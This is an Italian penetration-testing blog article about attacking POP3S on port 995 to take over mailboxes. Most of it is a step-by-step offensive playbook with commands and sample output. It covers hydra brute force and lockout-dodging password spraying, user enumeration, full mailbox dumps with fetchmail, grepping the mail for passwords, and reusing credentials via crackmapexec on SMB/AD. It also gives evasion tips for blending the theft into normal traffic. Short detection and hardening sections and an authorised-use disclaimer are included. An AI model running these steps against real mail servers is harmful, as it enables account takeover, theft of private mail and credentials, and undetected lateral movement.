---
title: 'Porta 995 POP3S: brute force, mailbox dump e credential reuse sulle email cifrate.'
slug: porta-995-pop3s
description: 'Scopri cos’è la porta 995 pop3s, perché POP3 over TLS usa cifratura implicita sul canale email e come credenziali deboli, mailbox access e contenuti sensibili rendono POP3S un target ancora rilevante.'
image: /porta-995-pop3s.webp
draft: true
date: 2026-04-09T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - credential-reuse
  - mailbox-dump
---

> **Executive Summary** — La porta 995 espone POP3S (POP3 over implicit TLS), il protocollo per scaricare email dalla mailbox. POP3 è più semplice di IMAP — scarica e (opzionalmente) cancella i messaggi dal server. Un accesso POP3S compromesso significa leggere tutte le email dell'utente, che spesso contengono password in chiaro, link di reset password, documenti riservati e informazioni interne. Le credenziali POP3 sono quasi sempre le stesse dell'account email (AD, O365, Google) — il credential reuse è automatico. Questa guida copre brute force, mailbox dump e analisi email per information gathering.

```id="b7y4nf"
TL;DR

- POP3S sulla porta 995 è POP3 con TLS implicito — protegge il canale ma le credenziali deboli restano il vettore principale
- Le credenziali POP3 sono le stesse dell'account email (e spesso di AD/VPN/OWA) — compromettere POP3 = compromettere l'identità
- Le email scaricate contengono password, reset link, documenti riservati, organigrammi e informazioni per social engineering

```

Porta 995 POP3S è il canale TCP del protocollo POP3 con TLS implicito per il download sicuro delle email. La porta 995 vulnerabilità principali sono le credenziali deboli (spesso condivise con AD e altri servizi), l'assenza di rate limiting per brute force e il contenuto sensibile delle email. L'enumerazione porta 995 rivela il mail server, la versione, la configurazione TLS e, con credenziali valide, l'intera mailbox. Nel POP3S pentest, compromettere una casella email è uno dei finding con maggior impatto: le email contengono credenziali, documenti interni, catene di approvazione e informazioni perfette per il phishing mirato. Nella kill chain si posiziona come credential access (password in email) e come recon avanzata (organigrammi, relazioni, processi interni).

## 1. Anatomia Tecnica della Porta 995

La porta 995 è registrata IANA come `pop3s`. POP3 (Post Office Protocol v3) è il protocollo per scaricare email dal server — più semplice di IMAP, scarica i messaggi localmente.

| Porta   | Protocollo | TLS              | Operazione                 |
| ------- | ---------- | ---------------- | -------------------------- |
| 110     | POP3       | No / STARTTLS    | Download email in chiaro   |
| **995** | **POP3S**  | **Implicit TLS** | **Download email cifrato** |
| 143     | IMAP       | No / STARTTLS    | Accesso email (sync)       |
| 993     | IMAPS      | Implicit TLS     | Accesso email cifrato      |

Differenza [POP3](https://hackita.it/articoli/porta-110-pop3) vs [IMAP](https://hackita.it/articoli/porta-143-imap):

* **POP3**: scarica email e le rimuove dal server (default). Semplice, stateless
* **IMAP**: sincronizza email con il server. Cartelle, flag, ricerca server-side

Il flusso POP3S:

1. Client si connette alla porta 995 → TLS handshake immediato
2. Server invia banner: `+OK POP3 server ready`
3. Client si autentica: `USER [email]` + `PASS [password]`
4. Client lista messaggi: `LIST`, `STAT`
5. Client scarica messaggi: `RETR [n]`
6. Client (opzionalmente) cancella: `DELE [n]`
7. Disconnessione: `QUIT`

```
Misconfig: Nessun rate limiting su autenticazione POP3S
Impatto: brute force illimitato sulle credenziali email
Come si verifica: 10+ tentativi rapidi senza blocco = no rate limiting
```

```
Misconfig: POP3 plain (110) attivo accanto a POP3S (995)
Impatto: credenziali in chiaro se il client usa la 110
Come si verifica: nmap -p 110,995 [target] — se entrambe aperte, documenta come finding
```

```
Misconfig: Credenziali email condivise con AD/VPN/OWA
Impatto: compromettere POP3 compromette tutti i servizi dell'utente
Come si verifica: testa le stesse credenziali POP3 su SSH, RDP, OWA, VPN
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 995 10.10.10.25
```

**Output atteso:**

```
PORT    STATE SERVICE  VERSION
995/tcp open  pop3s    Dovecot pop3d
| ssl-cert: Subject: CN=mail.corp.local
|   Issuer: CN=Let's Encrypt Authority X3
| pop3-capabilities:
|   SASL(PLAIN LOGIN)
|   TOP
|   UIDL
|   RESP-CODES
|_  PIPELINING
```

**Cosa ci dice questo output:** Dovecot POP3 con TLS. Il certificato rivela `mail.corp.local`. Le capability includono `SASL(PLAIN LOGIN)` — autenticazione con username e password. `PIPELINING` permette comandi multipli in una connessione — utile per brute force efficiente.

### Comando 2: Banner grab con openssl

```bash
openssl s_client -connect 10.10.10.25:995 -quiet
```

**Output atteso:**

```
+OK Dovecot (Ubuntu) ready.
```

**Cosa ci dice questo output:** Dovecot su Ubuntu. La versione esatta è utile per CVE matching. Il banner `+OK` conferma POP3 attivo e pronto per l'autenticazione.

## 3. Enumerazione Avanzata

### Test credenziali manuale

```bash
openssl s_client -connect 10.10.10.25:995 -quiet
USER admin@corp.local
PASS Password123
```

**Output (successo):**

```
+OK Logged in.
```

**Output (fallimento):**

```
-ERR [AUTH] Authentication failed.
```

**Lettura dell'output:** `+OK Logged in` = credenziali valide. `-ERR Authentication failed` = credenziali errate. Il formato dell'errore può rivelare informazioni: se distingue tra "user not found" e "wrong password", permette enumerazione utenti.

### User enumeration via timing/response

```bash
# Testa utente esistente
openssl s_client -connect 10.10.10.25:995 -quiet <<EOF
USER admin@corp.local
PASS wrongpassword
QUIT
EOF

# Testa utente inesistente
openssl s_client -connect 10.10.10.25:995 -quiet <<EOF
USER fakeuser12345@corp.local
PASS wrongpassword
QUIT
EOF
```

**Output (utente esiste — errore password):**

```
-ERR [AUTH] Authentication failed.
```

**Output (utente non esiste — errore diverso):**

```
-ERR [AUTH] Invalid user.
```

**Lettura dell'output:** se i messaggi di errore sono diversi, puoi enumerare utenti validi prima del brute force. Non tutti i server differenziano — Dovecot di default non lo fa, ma Exchange e altri possono. Per correlare gli utenti, usa l'[enumerazione SMTP sulla porta 587](https://hackita.it/articoli/porta-587-smtp-submission).

### TLS audit

```bash
testssl.sh 10.10.10.25:995
```

**Output:**

```
Testing protocols
 TLS 1.3    yes
 TLS 1.2    yes
 TLS 1.1    no
 TLS 1.0    no
Vulnerabilities:
 BEAST      not vulnerable
 POODLE     not vulnerable
 Heartbleed not vulnerable
```

## 4. Tecniche Offensive

**Brute force credenziali POP3S**

Contesto: server POP3S identificato. Utenti email noti (da SMTP enum o OSINT).

```bash
hydra -L users.txt -P /usr/share/wordlists/common.txt pop3s://10.10.10.25:995 -t 4 -W 5
```

**Output (successo):**

```
[995][pop3s] host: 10.10.10.25   login: hr@corp.local   password: Spring2026!
```

**Cosa fai dopo:** accesso alla mailbox di HR. Le email HR contengono: onboarding con credenziali temporanee, documenti riservati (salari, performance review), comunicazioni con fornitori. Testa `Spring2026!` su OWA, VPN, AD — il [credential reuse](https://hackita.it/articoli/bruteforce) è quasi garantito.

**Mailbox dump completo**

Contesto: credenziali POP3 valide. Scarica tutte le email per analisi offline.

```bash
# Con fetchmail
cat > /tmp/.fetchmailrc << EOF
poll 10.10.10.25
  protocol pop3
  port 995
  username "hr@corp.local"
  password "Spring2026!"
  ssl
  sslcertck no
  mda "cat >> /tmp/mailbox.mbox"
  fetchall
  keep
EOF
chmod 600 /tmp/.fetchmailrc
fetchmail -f /tmp/.fetchmailrc -v
```

**Output:**

```
reading message hr@corp.local@10.10.10.25:1 of 47 (3456 octets) retained
reading message hr@corp.local@10.10.10.25:2 of 47 (12890 octets) retained
...
47 messages retrieved, 47 retained
```

**Cosa fai dopo:** 47 email scaricate. Analizza con grep per credenziali, link e allegati:

```bash
grep -i "password\|credential\|login\|token\|reset" /tmp/mailbox.mbox
```

**Output:**

```
Subject: VPN Access - New Credentials
Your temporary password is: Corp_VPN_2026!

Subject: Azure Portal Access
Your Azure login: it-admin@corp.onmicrosoft.com / Az!Temp2026
```

Credenziali VPN e Azure trovate nelle email. Finding critico — accesso a servizi aggiuntivi.

**Credential spray con credenziali POP3 trovate**

Contesto: password trovata su POP3. Testa su altri servizi.

```bash
# OWA
crackmapexec http 10.10.10.25 -u hr@corp.local -p 'Spring2026!' -d corp.local

# SMB/AD
crackmapexec smb 10.10.10.10 -u hr -p 'Spring2026!' -d corp

# SSH
ssh hr@10.10.10.25
```

**Cosa fai dopo:** se la password funziona su AD/SMB, hai accesso al dominio. Per il [lateral movement AD](https://hackita.it/articoli/active-directory), usa le credenziali per enumerare e muoverti.

**Analisi allegati email**

Contesto: email scaricate contengono allegati. Estrai e analizza.

```bash
# Estrai allegati con munpack
munpack /tmp/mailbox.mbox -C /tmp/attachments/
ls /tmp/attachments/
```

**Output:**

```
Budget_2026.xlsx
VPN_Config.ovpn
Server_Inventory.pdf
New_Employee_Checklist.docx
```

**Cosa fai dopo:** `VPN_Config.ovpn` contiene la configurazione VPN — potenzialmente con credenziali embedded. `Server_Inventory.pdf` rivela hostname e IP interni. `New_Employee_Checklist.docx` contiene procedure e credenziali temporanee standard.

## 5. Scenari Pratici di Pentest

### Scenario 1: Mail server enterprise con POP3S

**Situazione:** server email Dovecot/Exchange con porta 995 aperta. Assessment interno.

**Step 1:**

```bash
nmap -sV -p 110,993,995 10.10.10.25
```

**Step 2:**

```bash
# Utenti da SMTP enum o LDAP
hydra -L email_users.txt -p 'Corp2026!' pop3s://10.10.10.25:995 -t 2
```

**Step 3:**

```bash
# Download mailbox degli account compromessi
fetchmail -f .fetchmailrc -v
grep -ri "password\|vpn\|credential" /tmp/mailbox.mbox
```

**Se fallisce:**

* Causa: lockout policy su email (tipicamente 5 tentativi)
* Fix: spray con 1 password per tutti gli utenti, pausa 31 minuti, ripeti

**Tempo stimato:** 15-60 minuti

### Scenario 2: POP3 plain + POP3S entrambi attivi

**Situazione:** porta 110 e 995 entrambe aperte.

**Step 1:**

```bash
nmap -sV -p 110,995 10.10.10.25
```

**Step 2:**

```bash
# POP3 plain — credential sniffing possibile
telnet 10.10.10.25 110
USER admin@corp.local
PASS test123
```

**Step 3:**

```bash
# Documenta: POP3 plain (110) aperto = credenziali possono transitare in chiaro
# Finding: disabilitare porta 110, forzare POP3S
```

**Tempo stimato:** 5-10 minuti

### Scenario 3: Post-exploitation — intelligence gathering dalle email

**Situazione:** hai compromesso un account email (DA o C-level). Analisi per intelligence.

**Step 1:**

```bash
# Dump completo mailbox
fetchmail -f .fetchmailrc
```

**Step 2:**

```bash
# Cerca informazioni tattiche
grep -ri "board meeting\|acquisition\|layoff\|merge" /tmp/mailbox.mbox
grep -ri "infrastructure\|server\|firewall\|vpn" /tmp/mailbox.mbox
```

**Se fallisce:**

* Causa: POP3 non configurato sull'account (solo IMAP/OWA)
* Fix: usa IMAP (993) o accedi via OWA con le stesse credenziali

**Tempo stimato:** 30-60 minuti per analisi completa

## 6. Attack Chain Completa

| Fase         | Tool           | Comando                         | Risultato              |
| ------------ | -------------- | ------------------------------- | ---------------------- |
| Recon        | nmap           | `nmap -sV -p 110,993,995`       | Mail server confermato |
| TLS Audit    | testssl        | `testssl.sh [target]:995`       | Qualità cifratura      |
| User Enum    | smtp-user-enum | Enumera utenti su porta 587/25  | Lista email valide     |
| Brute Force  | hydra          | `hydra pop3s://[target]:995`    | Credenziali email      |
| Mailbox Dump | fetchmail      | Download tutte le email         | Intelligence           |
| Cred Extract | grep           | `grep -i password mailbox.mbox` | Credenziali da email   |
| Lateral Move | cme            | Stesse credenziali su SMB/AD    | Accesso dominio        |

## 7. Detection & Evasion

### Blue Team

* **Mail log**: tentativi di autenticazione POP3 — `/var/log/mail.log`
* **SIEM**: brute force pattern, login da IP anomali
* **O365/Exchange**: audit log con accessi POP3 non previsti
* **DLP**: alert su download massivo di email

### Evasion

```
Tecnica: POP3S cifra il contenuto
Come: il download delle email è invisibile a IDS/DLP (canale TLS)
Riduzione rumore: solo i metadati della connessione sono visibili
```

```
Tecnica: Mantieni i messaggi sul server (keep)
Come: usa l'opzione "keep" — non cancellare email dopo il download
Riduzione rumore: l'utente non nota email mancanti
```

```
Tecnica: Download durante orari lavorativi
Come: il traffico POP3 si mischia con i check email normali
Riduzione rumore: indistinguibile dall'attività legittima del mail client
```

## 8. Toolchain e Confronto

| Aspetto            | POP3S (995)          | POP3 (110)        | IMAPS (993)               | OWA (443)   |
| ------------------ | -------------------- | ----------------- | ------------------------- | ----------- |
| TLS                | Implicit             | STARTTLS/No       | Implicit                  | HTTPS       |
| Operazione         | Download + delete    | Download + delete | Sync server-side          | Web access  |
| Offline access     | Sì (email scaricate) | Sì                | Parziale                  | No          |
| Brute force tool   | hydra                | hydra             | hydra                     | hydra/ruler |
| Content visibility | Tutte le email       | Tutte le email    | Tutte le email + cartelle | Tutto       |

## 9. Troubleshooting

| Errore                              | Causa                               | Fix                              |
| ----------------------------------- | ----------------------------------- | -------------------------------- |
| `Connection refused` su 995         | POP3S non abilitato (solo IMAP?)    | Prova 993 (IMAPS)                |
| `-ERR Plaintext auth disabled`      | Server richiede SASL/CRAM-MD5       | Usa client che supporta CRAM-MD5 |
| hydra `invalid response`            | hydra non gestisce bene TLS su POP3 | Usa `medusa -M pop3 -n 995 -F`   |
| fetchmail `SSL certificate problem` | Cert self-signed                    | `sslcertck no` in .fetchmailrc   |
| `-ERR [SYS/PERM] Lockout`           | Troppi tentativi falliti            | Aspetta il reset (30-60 min)     |

## 10. FAQ

**D: Che differenza c'è tra POP3S (995) e IMAPS (993)?**
R: POP3 scarica le email e le rimuove dal server (default). IMAP sincronizza — le email restano sul server con cartelle e flag. POP3 è più semplice per il dump offline; IMAP è più completo per l'analisi.

**D: Le credenziali POP3 sono le stesse di Active Directory?**
R: Quasi sempre sì in ambienti enterprise. Exchange/Dovecot autenticano contro AD. Compromettere POP3 = compromettere l'identità AD dell'utente.

**D: Come proteggere POP3S sulla 995?**
R: Disabilita POP3 plain (110). Rate limiting e lockout su autenticazione. 2FA se supportato (raro su POP3). Monitora accessi da IP anomali. Considera la disabilitazione completa di POP3 in favore di IMAP o web access.

## 11. Cheat Sheet Finale

| Azione              | Comando                                               |
| ------------------- | ----------------------------------------------------- |
| Scan                | `nmap -sV -p 110,993,995 [target]`                    |
| Banner              | `openssl s_client -connect [target]:995 -quiet`       |
| TLS audit           | `testssl.sh [target]:995`                             |
| Login test          | `openssl s_client ... → USER [email] → PASS [pass]`   |
| Brute force         | `hydra -L users.txt -P wordlist pop3s://[target]:995` |
| List messages       | `STAT` / `LIST` dopo login                            |
| Read message        | `RETR [n]`                                            |
| Dump mailbox        | `fetchmail -f .fetchmailrc -v`                        |
| Extract creds       | `grep -ri "password\|token\|credential" mailbox.mbox` |
| Extract attachments | `munpack mailbox.mbox -C /tmp/attachments/`           |
| Cred reuse test     | `crackmapexec smb [DC] -u user -p found_pass`         |

### Perché Porta 995 è rilevante nel 2026

L'email resta il repository non intenzionale di credenziali, documenti riservati e intelligence organizzativa. POP3S è ancora attivo su molti mail server enterprise (Exchange, Dovecot, Zimbra). Le credenziali email sono quasi sempre le stesse di AD — un singolo account compromesso via POP3 può aprire l'intera infrastruttura. Il canale [TLS](https://hackita.it/articoli/tls) rende il download invisibile a IDS/DLP.

### Hardening

* Disabilita POP3 plain (porta 110)
* Considera la disabilitazione completa di POP3 se non necessario
* Rate limiting e lockout: 5 tentativi max, blocco 30 minuti
* Monitora accessi POP3 da IP/geo anomali
* TLS 1.2+ con cipher forti
* Se possibile, abilita 2FA/MFA anche per protocolli legacy

### OPSEC

POP3S cifra il contenuto — il dump è invisibile a livello rete. Usa `keep` per non cancellare email dal server. Scarica durante orari lavorativi per mimetizzarti con il traffico legittimo. Il brute force genera log — se possibile, usa credenziali trovate altrove (LDAP description, Responder, breach DB).

***

Riferimento: RFC 1939 (POP3), RFC 2595 (TLS for POP3). Uso esclusivo in ambienti autorizzati. Approfondimento: [https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=995](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=995)

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
